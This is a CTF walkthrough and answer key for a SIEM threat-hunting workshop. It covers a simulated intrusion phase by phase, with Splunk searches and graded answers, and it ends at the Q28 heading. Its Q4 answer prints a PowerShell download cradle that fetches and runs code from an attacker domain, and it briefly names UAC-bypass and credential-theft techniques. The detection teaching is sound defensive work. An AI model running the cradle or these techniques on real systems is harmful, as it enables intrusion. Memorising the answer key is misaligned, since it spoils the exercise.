# CCS CTF: Hunting Through the SIEM - Walkthrough & Answer Guide

**Workshop:** Hunting Through the SIEM  
**Scenario:** Cryptid Conservation Society (CCS): APT41-style Intrusion  
**Timeline:** September 8–11, 2025  
**Splunk Index:** `index=ctf`

---

## Scenario Overview

The Cryptid Conservation Society (CCS), a nonprofit dedicated to researching and protecting cryptid species, was targeted by a sophisticated threat actor over four days. The attacker conducted external reconnaissance, delivered a malicious Office document via spearphishing, established persistent access, escalated privileges, moved laterally across the network, collected sensitive research data, and exfiltrated it to external infrastructure.

**Key Actors:**
| Name | Role | Host | IP |
|---|---|---|---|
| `lrodriguez` | Initial victim (Communications & Outreach) | CCS-WS-1025 | 10.10.10.76 |
| `awilliams` | IT Admin (pivoted to via token theft) | CCS-WS-1010 | 10.10.10.61 |
| `ccssupport` | Backdoor account created by attacker | CCS-WS-1025 | N/A |

**Attacker Infrastructure:**
| Asset | Value |
|---|---|
| Scanner IPs | 45.142.212.100, 45.142.212.101, 185.220.101.47 |
| C2 Domain | cdn-update.globalmetrics.net (103.75.190.222) |
| Exfil Domain | telemetry.syncanalytics.io (185.250.151.84) |
| DNS Tunnel NS | ns1.r3solve-stats.com |
| C2 JA3 Hash | a0e9f5d64349fb13191bc781f81f42e1 |

**Point Tiers:**
- 🟢 Beginner: 100 pts
- 🟡 Intermediate: 250 pts
- 🔴 Expert: 500 pts

---

## Phase 1: Reconnaissance

Before launching the attack, the threat actor conducted external reconnaissance against CCS's public-facing infrastructure. They used automated vulnerability scanning tools to probe the web server and enumerated internal DNS records to map the organization's network structure. This phase generated noisy but detectable signals in HTTP and DNS logs.

---

### Q1: Web Vulnerability Scanning 🟢 100 pts

**Question:** What external IP address performed vulnerability scanning against the CCS web server, generating over 50 HTTP 404 errors?

**What's happening:** Automated scanners typically probe hundreds of common web paths in rapid succession. Most of these paths don't exist, generating a flood of 404 responses. A single IP generating 50+ 404s in a short window is a strong signal of active scanning; normal users rarely hit more than a handful of missing pages.

**Hint:** Look for IPs generating unusually high 404 error rates against the web server.

**Splunk Search:**
```
index=ctf sourcetype="zeek:http:json" status="Not Found"
|stats count by src_ip
| sort -count
```

**Answer:** `45.142.212.100`

**Explanation:** This search aggregates all HTTP 404 responses from Zeek's http.log, groups them by source IP, and filters for any IP exceeding 50 hits. The attacker's scanner stands out dramatically from normal browsing behavior.

---

### Q2: DNS Subdomain Enumeration 🔴 500 pts

**Question:** The attacker probed multiple CCS subdomains from 45.142.212.100. Which one reveals the organization is running Microsoft Exchange?

**What's happening:** After identifying the target organization, the attacker queried DNS for multiple internal CCS subdomains to map out services: `remote.ccs.dev`, `www.ccs.dev`, `webmail.ccs.dev`, `vpn.ccs.dev`, `mail.ccs.dev`, and `autodiscover.ccs.dev`. The search returns all six, but one stands out: `autodiscover` is an endpoint specific to Microsoft Exchange. No other mail platform uses it. Recognizing what each subdomain implies about the underlying infrastructure is the skill being tested here. 

**Hint:** The attacker probed multiple CCS subdomains; which one is specific to Microsoft Exchange and reveals mail server infrastructure?

**Splunk Search:**
```
index=ctf sourcetype="zeek:dns:json" query="*.ccs.dev"  src_ip="45.142.212.100"
| table query
```

**Answer:** `autodiscover.ccs.dev`

**Explanation:** The Autodiscover service is used exclusively by Microsoft Exchange and Outlook to automatically configure email client settings. Its presence confirms CCS runs Exchange on-premises or Exchange Online. This is valuable to the attacker: it identifies the mail server infrastructure, a high-value target for credential harvesting and lateral movement. The other subdomains (`vpn`, `webmail`, `remote`) are generic enough to belong to many platforms; `autodiscover` is Exchange-specific.

---

## Phase 2: Initial Access

Armed with reconnaissance data, the attacker sent a spearphishing email with a malicious Office document to `lrodriguez`, a Communications & Outreach employee. When opened, the document executed a macro that launched a PowerShell download cradle, connecting back to the attacker's C2 server. This happened on September 9 at 10:15 AM.

---

### Q3: Malicious Office Child Process 🟢 100 pts

**Question:** What process was spawned as a child of WINWORD.EXE on the initial victim's workstation, indicating a malicious Office document?

**What's happening:** Microsoft Word (WINWORD.EXE) has no legitimate reason to spawn `cmd.exe` or PowerShell directly. This parent-child relationship is a classic indicator of a malicious macro or exploit inside an Office document. Sysmon Event ID 1 (Process Create) captures this relationship via the `ParentImage` field.

**Hint:** Look for Office applications spawning command-line processes.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=1 ParentImage="*WINWORD*" 
| stats count by Image CommandLine
```

**Answer:** `cmd.exe`

**Explanation:** The document macro used `cmd.exe` as an intermediary to then launch PowerShell with an encoded payload. This two-step approach (WINWORD → cmd.exe → powershell.exe) is common to help evade simple parent-process detections that only watch for WINWORD spawning PowerShell directly.

---

### Q4: Encoded PowerShell Payload 🔴 500 pts

**Question:** What payload URL is revealed when you decode the base64 `-enc` parameter in the PowerShell command launched by WINWORD.EXE?

**What's happening:** Attackers frequently base64-encode PowerShell commands using the `-EncodedCommand` (`-enc`) flag to obfuscate the actual payload from simple string-based detections. The search surfaces the raw CommandLine; you then decode the base64 string manually using CyberChef, PowerShell, or Python to reveal the true command.

**Hint:** Decode the base64 `-enc` parameter to reveal the download cradle.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=1 Image="*powershell.exe*" CommandLine="* -enc *"
| table TimeCreated Computer ParentImage Image CommandLine
```

Copy the base64 string from the `CommandLine` field (the value after `-enc`) and decode it using any of the following:

- **CyberChef:** paste into "From Base64" then "Decode text" (UTF-16LE)
- **PowerShell:** `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<paste here>'))`
- **Python:** `import base64; base64.b64decode('<paste here>').decode('utf-16-le')`

**Answer:** `IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.globalmetrics.net/update')`

**Explanation:** The decoded payload is a classic PowerShell download cradle: `IEX` (Invoke-Expression) combined with `DownloadString` downloads a remote script and immediately executes it in memory without writing a file to disk. This technique bypasses many AV products that only scan files on disk. Note that PowerShell base64 encoded commands use UTF-16LE encoding, not standard UTF-8, which is why a plain base64 decode will produce garbled output without specifying the correct encoding.

---

### Q5: C2 Domain First Seen in DNS 🟢 100 pts

**Question:** What C2 domain first appeared in DNS logs immediately after the phishing attachment was opened?

**What's happening:** When the download cradle executed, PowerShell needed to resolve the C2 domain before making the HTTPS connection. This DNS query for `cdn-update.globalmetrics.net` represents the very first network indicator of compromise, the moment the victim's machine "phoned home." A domain never seen in prior DNS baseline traffic is a strong anomaly signal.

**Hint:** Look for DNS queries to domains that have never appeared in the prior 24 hours of logs.

**Splunk Search:**
```
index=ctf sourcetype="zeek:dns:json" 
| stats count by query
| sort +count
```

**Answer:** `cdn-update.globalmetrics.net`

**Explanation:** The domain name is deliberately crafted to look legitimate: `cdn-update` sounds like a content delivery network update service, and `globalmetrics.net` sounds like an analytics company. This kind of typosquatting/lookalike domain is a hallmark of sophisticated threat actors.

---

### Q6: JA3 TLS Fingerprint Correlation 🔴 500 pts

**Question:** The attacker's C2 traffic carries a known JA3 fingerprint of `a0e9f5d64349fb13191bc781f81f42e1`. What C2 domain did powershell.exe connect to using this fingerprint?

**What's happening:** JA3 is a method of fingerprinting TLS client "hellos" based on parameters like supported cipher suites and TLS version. Each application tends to produce a consistent JA3 hash. By finding which process (via Sysmon EID 3) connected to the same destination IP that appears in ssl.log with our target JA3, we can prove it was powershell.exe making the C2 connection.

**Hint:** Correlate outbound network connections from powershell.exe with ssl.log JA3 hashes. Sysmon EventID 3 (Network Connection) records the destination IP for each process.

**Splunk Search:**
```
index=ctf sourcetype="zeek:ssl:json" ja3="a0e9f5d64349fb13191bc781f81f42e1"
    [search index=ctf EventID=3 Image="*powershell*"
    | rename DestinationIp AS dest_ip
    | fields dest_ip]
| stats count by server_name dest_ip
```

**Answer:** `cdn-update.globalmetrics.net`

**Explanation:** The subsearch finds all destination IPs where Sysmon recorded powershell.exe making an outbound network connection (EID 3). Those IPs are then used to filter ssl.log, returning only TLS sessions from powershell.exe, in this case the single session to the C2 server. This technique is powerful because it links network evidence (Zeek) to process evidence (Sysmon) without requiring a shared identifier.

---

## Phase 3: Execution & Persistence

After establishing the initial shell, the attacker immediately deployed three persistence mechanisms to ensure they could survive reboots and retain access even if the initial implant was detected. All three were installed within 3 minutes of each other at 10:48–10:50 AM on September 9.

---

### Q7: Malicious Scheduled Task 🟢 100 pts

**Question:** What is the full path of the binary configured in the attacker's malicious MicrosoftEdgeUpdate scheduled task?

**What's happening:** Windows logs scheduled task creation as EventID 4698 in the Security log. The attacker created a task named `MicrosoftEdgeUpdate` to blend in with legitimate Microsoft Edge update tasks, but the binary path points to `AppData\Roaming`, not `Program Files`. Legitimate Microsoft tasks never use AppData for their executables.

**Hint:** Legitimate scheduled tasks point to Program Files, not AppData. Check Windows Security logs for scheduled task creation events (search for MicrosoftEdgeUpdate).

**Splunk Search:**
```
index=ctf EventID=4698 TaskName="*MicrosoftEdgeUpdate*"
| where like(TaskContent,"%AppData%")
| table TaskContent
```

**Answer:** `C:\Users\lrodriguez\AppData\Roaming\MicrosoftEdge\update.exe`

**Explanation:** The attacker chose the `AppData\Roaming` path deliberately; it's writable by the user without admin rights and is within a directory structure that sounds plausible for Edge. The task name mimics the real Microsoft Edge update task, making it easy to overlook during a casual review.

---

### Q8: Registry Run Key Persistence 🟢 100 pts

**Question:** What Registry Run key name was created by the attacker to maintain persistence pointing to an executable in AppData\Roaming?

**What's happening:** Registry Run keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) cause a program to execute every time a user logs in. Sysmon EID 13 (Registry Value Set) captures these changes. The attacker named the key `OneDriveSync` to blend in with the legitimate OneDrive sync client, but legitimate OneDrive run keys point to `%LOCALAPPDATA%`, not `%APPDATA%\Roaming`.

**Hint:** Legitimate OneDrive run keys point to `%LOCALAPPDATA%`, not `%APPDATA%\Roaming`.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=13 TargetObject="*Run*" Details="*AppData*Roaming*"
NOT Details="*Microsoft\\OneDrive*"
| table registry_value_name
```

**Answer:** `OneDriveSync`

**Explanation:** This is a classic living-off-the-land persistence technique. The attacker doesn't need to install any drivers or services; a simple registry key with write access from a standard user account is sufficient to achieve login persistence. The masquerading name `OneDriveSync` exploits the fact that administrators often see many OneDrive-related entries and skip over them.

---

### Q9: Malicious Windows Service 🟢 100 pts

**Question:** What is the full path of the malicious Windows service binary installed in an anomalous location?

**What's happening:** Windows EventID 7045 (System log) records new service installations. Legitimate Windows services are installed in `%SystemRoot%\System32`, `%ProgramFiles%`, or similar system directories. A service binary in `C:\Windows\Temp` is never legitimate; Temp is a writable directory accessible to standard users and is a common attacker staging location.

**Hint:** Legitimate service binaries are never installed in Windows Temp. Look for new service installation events in the Windows System log.

**Splunk Search:**
```
index=ctf EventID=7045 ImagePath="*Temp*"
| table ServiceName ImagePath Computer
```

**Answer:** `C:\Windows\Temp\svchost32.exe`

**Explanation:** The attacker named the binary `svchost32.exe` to mimic the legitimate Windows service host process `svchost.exe`. The real svchost.exe lives in `System32` and never in Temp. The `32` suffix is a subtle masquerading attempt. This binary became the primary implant on the system going forward.

---

## Phase 4: Privilege Escalation

With persistence established under `lrodriguez`'s standard user context, the attacker needed to escalate privileges to perform more impactful operations. They used two techniques in quick succession: token impersonation to borrow an IT admin's credentials, and a UAC bypass using the Event Viewer (`eventvwr.exe`) to achieve high integrity execution.

---

### Q10: Token Impersonation via Runas 🔴 500 pts

**Question:** What domain account was impersonated on workstation ccs-ws-1025.ccs.dev to perform privileged network operations?

**What's happening:** LogonType 9 (NewCredentials) is created when a process is launched using `runas /netonly`; the process runs locally as the current user but uses different credentials for network authentication. Attackers use this after harvesting credentials to operate with a privileged identity for network access without needing to log out. The key indicator is a LogonType 9 event where `TargetUserName` differs from the machine's normal user.

**Hint:** Look for logon events on ccs-ws-1025.ccs.dev where the authenticating account differs from the workstation's regular user. LogonType 9 (NewCredentials) is created by `runas /netonly` and indicates stolen credentials being used for network access.

**Splunk Search:**
```
index=ctf EventID=4624 LogonType=9 TargetUserName!="lrodriguez"
Computer="ccs-ws-1025.ccs.dev"
```

**Answer:** `awilliams`

**Explanation:** The attacker had obtained `awilliams`' (IT Admin) credentials, likely from earlier reconnaissance or a credential file on the system, and used `runas /netonly` to impersonate them. All subsequent network operations (SMB access, PsExec, etc.) would appear to come from `awilliams`, a highly privileged IT admin account.

---

### Q11: UAC Bypass via Event Viewer 🔴 500 pts

**Question:** What binary was launched at High integrity level by eventvwr.exe as a UAC bypass on the victim workstation?

**What's happening:** `eventvwr.exe` (Event Viewer) is a well-known UAC auto-elevation bypass. It reads a registry key (`HKCU\Software\Classes\mscfile\shell\open\command`) before launching; if an attacker sets this key to a custom binary, Event Viewer will launch it elevated without a UAC prompt. Sysmon records the integrity level of new processes in EID 1. A non-Microsoft binary spawned by `eventvwr.exe` at `High` integrity is definitive evidence of this bypass.

**Hint:** `eventvwr.exe` is a known UAC bypass vector; look for it as a parent process.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=1 ParentImage="*eventvwr.exe*" IntegrityLevel=High
```

**Answer:** `C:\Windows\Temp\svchost32.exe`

**Explanation:** The attacker set the registry hijack key to point to their implant (`svchost32.exe`), then launched Event Viewer. Windows auto-elevated eventvwr.exe and it then launched the malicious binary with a high integrity token, giving the attacker the equivalent of admin rights without ever triggering a UAC prompt.

---

### Q12: Backdoor Account Creation 🟢 100 pts

**Question:** What local account was created on a non-domain-controller workstation using an impersonated IT admin token?

**What's happening:** EventID 4720 (Account Created) is logged when a new user account is added to the system. Accounts are legitimately created on Domain Controllers; seeing one created directly on a user workstation is extremely suspicious. The `SubjectUserName` field shows who performed the action; in this case, the IT admin token (`awilliams`) was used to create a backdoor account for persistent access.

**Hint:** Account creation events on non-IT workstations are suspicious. Search Windows Security logs for account creation and filter out events originating from domain controllers.

**Splunk Search:**
```
index=ctf EventID=4720 NOT Computer="*DC*"
| table TargetUserName SubjectUserName Computer
```

**Answer:** `ccssupport`

**Explanation:** The attacker created the `ccssupport` account directly on the workstation using the stolen `awilliams` admin token. The name `ccssupport` is designed to look like a legitimate IT support account, providing a persistent backdoor with a plausible cover story if discovered.

---

## Phase 5: Defense Evasion

Before continuing, the attacker worked to cover their tracks and make future activity harder to attribute. They cleared the Windows Security event log and modified file timestamps on their malware to make forensic timeline reconstruction harder.

---

### Q13: Security Log Cleared 🟢 100 pts

**Question:** What user account cleared the Windows Security event log?

**What's happening:** EventID 1102 is logged when the Windows Security event log is cleared. This is an extremely rare event in normal environments; legitimate administrators almost never clear logs. Attackers do it to destroy forensic evidence of their earlier activities (account logons, process creation, etc.). Ironically, the act of clearing the log is itself logged, making this one of the clearest possible indicators of malicious intent.

**Hint:** Clearing the security log is an extremely rare event that generates its own log entry. Search Windows Security logs for log-clear events (EventID 1102).

**Splunk Search:**
```
index=ctf EventID=1102
| table Computer user
```

**Answer:** `ccssupport`

**Explanation:** The attacker used the newly created `ccssupport` backdoor account to clear the Security log, attempting to erase evidence of all the preceding activity: the account creation, logon events, privilege escalations, and more. The clearance event itself, however, is still captured by the SIEM.

---

### Q14: Timestomping 🔴 500 pts

**Question:** What executable in AppData had its file creation timestamp modified to conceal the malware's true age?

**What's happening:** Timestomping modifies a file's `$STANDARD_INFORMATION` timestamps (Created, Modified, Accessed) to make malware appear older or match surrounding legitimate files. Forensic investigators often sort files by creation date to find new files; timestomping defeats this. Sysmon EID 2 (File Creation Time Changed) specifically captures this action, recording both the original and new timestamps.

**Hint:** Sysmon records when a file's creation timestamp is deliberately changed (EventID 2). Look for executables in AppData paths with modified timestamps.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=2 TargetFilename="*AppData*" TargetFilename="*.exe"
| table Computer Image file_path file_name
```

**Answer:** `C:\Users\lrodriguez\AppData\Roaming\MicrosoftEdge\update.exe`

**Explanation:** The attacker modified the timestamp on their implant to match surrounding legitimate files in the AppData directory, making it appear it had been installed long before the attack began. Without Sysmon EID 2 logging, this technique would successfully defeat timeline-based forensic analysis.

---

## Phase 6: Credential Access

With admin-level access established, the attacker went after credentials aggressively. They dumped LSASS memory, Kerberoasted service accounts, and identified AS-REP Roastable accounts, a comprehensive credential harvesting campaign targeting both current credentials and service account password hashes.

---

### Q15: LSASS Memory Dumping 🟡 250 pts

**Question:** What process accessed LSASS memory from a non-standard path, indicating a credential dumping attempt?

**What's happening:** LSASS (Local Security Authority Subsystem Service) holds credentials in memory including NTLM hashes and Kerberos tickets. Tools like Mimikatz read LSASS memory to extract these credentials. Sysmon EID 10 (Process Access) logs when one process opens a handle to another, capturing the source process, target process, and access rights requested. Legitimate processes accessing LSASS (`antivirus`, `Windows Defender`) run from System32; anything else is suspect.

**Hint:** LSASS access from non-system paths is a strong credential dumping indicator. Sysmon logs process access events (EventID 10) including which process opened a handle to another and with what access rights.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=10 TargetImage="*lsass.exe*"
NOT SourceImage="*System32*"
NOT SourceImage="*SysWOW64*"
```

**Answer:** `C:\Windows\Temp\svchost32.exe`

**Explanation:** The attacker's implant (`svchost32.exe`) directly accessed LSASS memory with `PROCESS_VM_READ` access rights (0x1010), the exact permissions needed to read credential material from memory. This is functionally equivalent to running Mimikatz. The NTLM hashes and Kerberos tickets extracted here enabled the subsequent Kerberoasting attacks.

---

### Q16: Kerberoasting 🟡 250 pts

**Question:** What service account was most heavily targeted during the attacker's Kerberos ticket harvesting activity?

**What's happening:** Kerberoasting requests TGS (Ticket Granting Service) tickets for service accounts, then cracks the ticket offline. The key indicator is that legitimate modern environments use AES-256 (0x12) or AES-128 (0x11) encryption; RC4 (0x17) is legacy and significantly weaker. An attacker requesting RC4 tickets for multiple service accounts in rapid succession is a textbook Kerberoasting signature.

**Hint:** Kerberoasting requests TGS tickets using weak RC4 encryption instead of modern AES. Look for Kerberos ticket request events (EventID 4769) with TicketEncryptionType "0x17" and find which service account appears most frequently.

**Splunk Search:**
```
index=ctf EventID=4769 TicketEncryptionType="0x17"
| eval ServiceName=mvindex(split(ServiceName,"/"),0)
| stats count by ServiceName
| sort -count
```

**Answer:** `svc_sql`

**Explanation:** The attacker requested RC4-encrypted TGS tickets for 12 service accounts within 4 minutes. `svc_sql` (the SQL Server service account) was among the targeted accounts; service accounts are preferred because they often have simple, older passwords set years ago and never rotated. Cracking `svc_sql`'s ticket offline would give the attacker the service account's plaintext password.

---

### Q17: AS-REP Roasting 🔴 500 pts

**Question:** What account was identified as not requiring Kerberos pre-authentication, making it vulnerable to offline password cracking without needing valid credentials?

**What's happening:** Normally, Kerberos requires a client to pre-authenticate (prove they know the password before getting a ticket). If an account has `Do not require Kerberos preauthentication` set, any unauthenticated user can request an AS-REP response containing encrypted data crackable offline, with no need to know the password first. EventID 4768 with `PreAuthType=0` is the definitive indicator.

**Hint:** AS-REP Roasting targets accounts with Kerberos pre-authentication disabled. Look for Kerberos authentication request events (EventID 4768) where PreAuthType=0.

**Splunk Search:**
```
index=ctf EventID=4768 PreAuthType=0
```

**Answer:** `svc_scan`

**Explanation:** The `svc_scan` service account had been misconfigured with pre-authentication disabled, likely an old IT configuration that was never cleaned up. The attacker identified this during enumeration and requested an AS-REP ticket for it, which they could crack offline without any authentication at all. This is why AS-REP Roastable accounts are considered critical misconfigurations.

---

## Phase 7: Discovery

With elevated credentials in hand, the attacker performed systematic Active Directory enumeration to map the organization's user accounts, group memberships, and trust relationships. This information was used to identify high-value targets for lateral movement.

---

### Q18: Domain Account Discovery 🟡 250 pts

**Question:** What built-in Windows command did the attacker run to enumerate all user accounts in the Active Directory domain?

**What's happening:** `net.exe` and `nltest.exe` are built-in Windows tools the attacker uses to enumerate domain information without installing any additional software ("living off the land"). Running these tools in rapid succession from a binary in `C:\Windows\Temp` is a strong behavioral indicator; the parent-process chain (Temp binary → net.exe/nltest.exe) is abnormal. The CommandLine field in Sysmon EID 1 shows the exact arguments passed, revealing what specific information the attacker was after.

**Hint:** Look for Windows built-in tools being spawned by a suspicious process running from C:\Windows\Temp. The specific command reveals what domain information the attacker was after.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=1 Image="*net.exe*"
| search ParentImage="*svchost32*"
| table TimeCreated CommandLine Computer
```

**Answer:** `net user /domain`

**Explanation:** `net user /domain` lists all user accounts in the Active Directory domain. Combined with `nltest.exe /domain_trusts` to enumerate domain trusts and `net group "Domain Admins" /domain` to identify privileged accounts, this rapid enumeration burst gave the attacker a complete picture of the domain in under two minutes.

---

### Q19: BloodHound AD Enumeration 🔴 500 pts

**Question:** What user account triggered a massive spike in Active Directory object access events within a 10-minute window, consistent with automated domain enumeration?

**What's happening:** BloodHound is an Active Directory attack path mapping tool that uses LDAP to rapidly enumerate all AD objects (users, groups, computers, GPOs). This generates a massive burst of EventID 4662 (Object Access) events on the Domain Controller, sometimes hundreds per minute. The object type `{bf967aba-0de6-11d0-a285-00aa003049e2}` is the GUID for `User` objects in Active Directory.

**Hint:** BloodHound generates hundreds of LDAP object access events per minute. Look for spikes in Active Directory object access events (EventID 4662) and find the account responsible.

**Splunk Search:**
```
index=ctf EventID=4662 ObjectType="{bf967aba-0de6-11d0-a285-00aa003049e2}"
| bin _time span=10m
| stats count by _time,SubjectUserName
| where count > 50
```

**Answer:** `lrodriguez`

**Explanation:** The attacker ran BloodHound under `lrodriguez`'s context (or using their token), generating 180+ LDAP object access events within 6 minutes. BloodHound collected this data to map attack paths, identifying which accounts and computers could be used to reach Domain Admin. Without this LDAP audit data, this phase would be nearly invisible.

---

## Phase 8: Lateral Movement

Using the credentials and attack path data gathered, the attacker moved from the initial victim's workstation (`CCS-WS-1025`, lrodriguez) to the file server (`CCS-FS01`) via SMB, then to the IT admin's workstation (`CCS-WS-1010`, awilliams) via PsExec, and finally RDP'd to an executive's laptop (`CCS-LT-1069`) to access sensitive executive data.

---

### Q20: SMB Lateral Movement to File Server 🟡 250 pts

**Question:** What source IP authenticated to the file server CCS-FS01 from a workstation that has no normal business reason to access it?

**What's happening:** LogonType 3 (Network Logon) is created when a user authenticates over the network, such as accessing a file share via SMB. A workstation IP connecting to the file server with IT admin credentials (`awilliams`) at an unusual time, with no prior history of doing so, is a lateral movement indicator. The `IpAddress` field in EID 4624 shows the connecting source.

**Hint:** Lateral movement to a file server often appears as a network logon (LogonType 3) in Windows Security logs (EventID 4624). Look for authentications to ccs-fs01.ccs.dev from unexpected source IPs.

**Splunk Search:**
```
index=ctf EventID=4624 LogonType=3 Computer="ccs-fs01.ccs.dev"
IpAddress="10.10.10.76"
```

**Answer:** `10.10.10.76`

**Explanation:** `10.10.10.76` is `lrodriguez`'s workstation (`CCS-WS-1025`). It connected to the file server using `awilliams`' stolen credentials. This is the token impersonation technique from Q10 in action; the network connection comes from lrodriguez's machine but authenticates as awilliams.

---

### Q21: PsExec Service Artifact 🟡 250 pts

**Question:** What well-known PsExec artifact service name was installed on CCS-WS-1010?

**What's happening:** PsExec (Sysinternals) is a legitimate remote administration tool widely abused by attackers for lateral movement. When PsExec runs on a target system, it always installs a service called `PSEXESVC` to facilitate command execution. This service installation is logged as EventID 7045 and is one of the most reliable indicators of PsExec usage.

**Hint:** PsExec always installs a recognizable service on the target system. Check Windows System logs for new service installation events (EventID 7045) on CCS-WS-1010.

**Splunk Search:**
```
index=ctf EventID=7045 ServiceName=PSEXESVC
```

**Answer:** `PSEXESVC`

**Explanation:** The attacker used PsExec with `awilliams`' credentials to remotely execute commands on `CCS-WS-1010` (the IT admin's own workstation). This gave them an interactive shell on the IT admin machine, which had access to sensitive administrative tools, scripts, and credentials stored on that system.

---

### Q22: RDP to Executive Laptop 🟢 100 pts

**Question:** What user account remotely connected from an IT workstation to an executive laptop?

**What's happening:** LogonType 10 (RemoteInteractive) is the Windows logon type for Remote Desktop connections. RDP from an IT workstation to an executive laptop is an unusual pairing; IT staff might legitimately RDP to servers, but an IT admin workstation RDP'ing to an executive's laptop at 3:46 PM with no helpdesk ticket context warrants investigation. The `IpAddress` shows the originating IP.

**Hint:** Remote Desktop connections appear as interactive logons in Windows Security logs (EventID 4624, LogonType 10). An IT workstation connecting to an executive laptop is an unusual pairing worth investigating.

**Splunk Search:**
```
index=ctf EventID=4624 LogonType=10 Computer="*ccs-lt*"
| table TargetUserName IpAddress Computer
```

**Answer:** `awilliams`

**Explanation:** The attacker RDP'd from `CCS-WS-1010` (the IT admin's workstation, now under attacker control) to `CCS-LT-1069`, an executive's laptop. The goal was to access sensitive executive data: strategic plans, financial information, or research data that might be stored locally on the executive's machine or accessible through their account.

---

## Phase 9: Collection

Before exfiltrating, the attacker spent several hours collecting data. They accessed large volumes of data on the file server via SMB, pivoted to the database server from the file server, and staged collected data in password-protected archives to prepare for exfiltration.

---

### Q23: Mass SMB Data Collection 🟡 250 pts

**Question:** What source IP sent over 100 MB of SMB data to the file server (10.10.2.10) on port 445 outside business hours?

**What's happening:** The attacker crawled the file server's shares via SMB, reading and staging large volumes of files. The `orig_bytes` field in Zeek's conn.log captures bytes sent from source to destination. During legitimate file access, users read files from the server (high resp_bytes), but an attacker staging data locally first, then transferring, can generate anomalous orig_bytes. Binning by time reveals after-hours activity.

**Hint:** Look for abnormally large SMB data volumes to the file server outside business hours.

**Splunk Search:**
```
index=ctf sourcetype="zeek:conn:json" id_resp_p=445 dest_ip="10.10.2.10"
| bin _time span=1h
| stats sum(orig_bytes) as bytes_sent count by _time,src_ip
| where bytes_sent > 100000000
```

**Answer:** `10.10.10.61`

**Explanation:** `10.10.10.61` is `awilliams`' workstation (`CCS-WS-1010`). Over 100 MB of data flowed from this workstation to the file server on port 445 (SMB) in a single hour, far beyond normal file access patterns. The attacker was systematically copying research files and sensitive documents to stage for exfiltration.

---

### Q24: Server-to-Server Database Access 🔴 500 pts

**Question:** What server IP made an unusual server-to-server PostgreSQL connection to the database server at 10.10.2.20?

**What's happening:** In a normal environment, only application servers and workstations connect to the database. The file server (`CCS-FS01`, 10.10.2.10) has no legitimate reason to initiate a PostgreSQL connection to the database server (`CCS-DB01`, 10.10.2.20). This server-to-server connection indicates the attacker pivoted from the file server to the database server to collect scientific research records.

**Hint:** Normally only workstations connect to DB01; connections from FS01 are unusual.

**Splunk Search:**
```
index=ctf sourcetype="zeek:conn:json"
dest_ip="10.10.2.20" id_resp_p=5432
| stats count by src_ip
```

**Answer:** `10.10.2.10`

**Explanation:** The file server (`CCS-FS01`) initiated a PostgreSQL connection to the database server, pulling data directly. The `resp_bytes` field captures data returned from the database; a large value confirms the attacker was dumping database records. This database contained the CCS's comprehensive research records on cryptid populations, habitats, and conservation status.

---

### Q25: Data Archiving with 7-Zip 🟢 100 pts

**Question:** What archive utility created a password-protected archive in ProgramData\MicrosoftTelemetry for data staging?

**What's happening:** Before exfiltrating, attackers commonly compress and encrypt collected data using legitimate tools like 7-Zip. The `-p` flag sets a password, creating an encrypted archive that cannot be inspected if intercepted. Staging in `ProgramData\MicrosoftTelemetry` is designed to look like legitimate Windows telemetry data, avoiding suspicion during a casual review.

**Hint:** Password-protected archives are used to prevent analysis of exfiltrated data. Check Sysmon process creation logs (EventID 1) for compression tools run with a password flag.

**Splunk Search:**
```
index=ctf sourcetype=XmlWinEventLog
EventID=1 Image="*7z.exe*" CommandLine="* -p*"
```

**Answer:** `7z.exe`

**Explanation:** The attacker used the legitimate, widely-available 7-Zip tool to compress and password-protect the staged data. Using a common utility instead of a custom tool helps evade detection; `7z.exe` is present on many enterprise systems and isn't inherently suspicious. The password protection ensures that even if the archive is captured in transit, its contents cannot be read without the key.

---

## Phase 10: Exfiltration

On September 11 at 2:03 AM, the attacker exfiltrated the collected data over multiple channels: encrypted HTTPS sessions to a dedicated exfil server, and a parallel DNS tunneling channel to encode data inside seemingly normal DNS queries. The timing (2 AM) was chosen to avoid detection during business hours.

---

### Q26: HTTPS Exfiltration Destination 🟡 250 pts

**Question:** What external IP received 6 large HTTPS sessions (each over 80 MB) from the file server at 2am, identifying the exfiltration destination?

**What's happening:** Large, sustained HTTPS connections from an internal server to an external IP at 2 AM are a textbook exfiltration pattern. The attacker split the data across 6 sessions (each 80–120 MB) to avoid any per-connection size thresholds. `orig_bytes` in Zeek's conn.log captures bytes sent from source (file server) to destination; filtering for sessions over 80 MB on port 443 quickly identifies the exfil target.

**Hint:** Large outbound transfers from a server at 2am are a strong exfiltration indicator.

**Splunk Search:**
```
index=ctf sourcetype="zeek:conn:json" src_ip="10.10.2.10" id_resp_p=443
| where orig_bytes > 80000000
| stats count sum(orig_bytes) by dest_ip
```

**Answer:** `185.250.151.84`

**Explanation:** The file server sent approximately 600+ MB of data across 6 HTTPS sessions to `185.250.151.84`, the attacker's dedicated exfiltration server. The encrypted HTTPS channel prevented DPI (Deep Packet Inspection) from reading the content, but the volume, timing, and destination IP all stand out clearly in flow data.

---

### Q27: Exfiltration Domain in DNS 🟢 100 pts

**Question:** What domain appeared for the first time in DNS logs from the file server immediately before the overnight exfiltration event?

**What's happening:** Just as with the initial C2 callback, the file server needed to resolve the exfil domain before making the HTTPS connection to the exfil server. A DNS query for a domain never previously seen in logs, originating from a server that rarely makes external DNS requests, is a strong first-seen domain anomaly indicator.

**Hint:** The exfil domain will appear as a first-ever DNS query from the file server.

**Hint:** Modify your search time to +-5 min from the exfiltration attempt.

**Splunk Search:**
```
index=ctf sourcetype="zeek:dns:json" query!="*ccs.dev"
| table _time query
| sort +_time
```

**Answer:** `telemetry.syncanalytics.io`

**Explanation:** `telemetry.syncanalytics.io` is crafted to sound like a legitimate analytics telemetry service. The file server has no baseline of ever querying this domain, making it a strong anomaly. Combining first-seen domain detection with the subsequent large HTTPS transfer provides high-confidence attribution of the exfiltration event.

---

### Q28: DNS Tunneling Exfiltration 🔴 500 pts

